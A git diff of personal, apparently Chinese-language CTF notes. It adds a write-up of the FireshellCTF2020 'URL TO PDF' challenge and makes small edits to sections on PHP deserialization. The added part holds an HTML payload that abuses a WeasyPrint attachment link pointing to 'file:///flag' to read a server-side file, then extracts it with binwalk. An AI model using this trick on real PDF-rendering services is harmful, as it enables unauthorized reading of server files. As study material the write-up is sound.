@@ -1,3 +1,23 @@
+# BUU
+
+### [FireshellCTF2020]URL TO PDF
+输入url,可以转pdf,nc可以看到请求来自![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231127235158.png)
+,搜索相关漏洞`weasyprint`
+
+写一个html
+```php
+<html>
+<body>
+<link rel='attachment' href='file:///flag'>
+</body>
+</html>
+```
+
+需要使用`binwalk -e`分离文件才能看见flag,可以看到明显文件大小与之前不一样了
+
+
+
+
 
 ### 2023浙江大学生省赛初赛
 #java 
@@ -527,31 +547,9 @@ print(base64.b64encode(test))
 
 
 
-## [SecurityValley - always on CTF](https://ctftime.org/event/1799)
-
-### Simple one
-
->   Our administrators have forgotten a file on our web server. This file is very important for us. Unfortunately, our admin also forgot the location of the file. Can you find this file?
-
-根据描述，先扫一下目录
-
-只扫出来一个
-
-`https://pwnme.org/assets/img/`
-
-![image-20230403212501334](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230403212501334.png)
-
-观察到响应标头 `n00b!`
-
-寄，签到题已经不会了
-
-其他题也有这个标头，说明方向也不是这个
-
 ## CTFSHOW 复现
 
 ### 被遗忘的反序列化
-
-*   
 
 ```php
 <?php
@@ -676,7 +674,7 @@ $c -> aaa = $a;
 echo serialize($a);
 ```
 
-wp提到了php 原生类 `GlobIterator`的用法，确实没有想到
+wp提到了php原生类 `GlobIterator`的用法，确实没有想到
 
 usage:
 
